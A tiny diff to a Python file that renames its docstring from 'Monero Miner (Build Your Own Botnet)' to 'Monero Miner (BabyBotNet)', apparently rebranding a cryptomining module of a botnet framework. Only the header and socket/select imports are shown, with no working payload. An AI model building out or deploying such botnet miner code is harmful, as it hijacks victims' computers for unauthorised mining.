@@ -1,5 +1,5 @@
 #!/usr/bin/python
-"Monero Miner (Build Your Own Botnet)"
+"Monero Miner (BabyBotNet)"
 
 import socket
 import select
